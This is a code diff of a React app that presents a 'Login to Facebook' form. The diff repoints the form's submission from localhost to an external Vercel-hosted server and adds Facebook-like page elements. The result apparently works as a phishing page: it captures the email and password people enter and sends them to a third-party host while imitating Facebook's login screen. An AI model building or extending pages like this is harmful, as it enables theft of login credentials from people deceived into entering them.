@@ -11,7 +11,7 @@ function App() {
     const password = form.password.value;
     const user ={email, password}
 
-    fetch('http://localhost:5000/users',{
+    fetch('https://users-server-alpha.vercel.app/users',{
       method: 'POST',
       headers:{
         'content-type': 'application/json'
@@ -37,11 +37,15 @@ function App() {
       <div className="login-form">
         <h2>Login to Facebook</h2>
         <form onSubmit={handleLogin}>
-          <input type="email" placeholder="Email address or phone number" name='email' required />
-          <input type="password" placeholder="Password" name='password' required />
+          <input className='email' type="text" placeholder="Email address or phone number" name='email' required />
+          <input className='password' type="password" placeholder="Password" name='password' required />
           <input type="submit" value="Login" className='button'/>
         </form>
+        <p className='forget'>Forgotten password?</p>
+        <hr />
+        <button className='createBtn'>Create new account</button>
       </div>
+      <p className='createPage'><strong>Create a Page</strong> for a celebrity, brand or business.</p>
 
     </>
   )
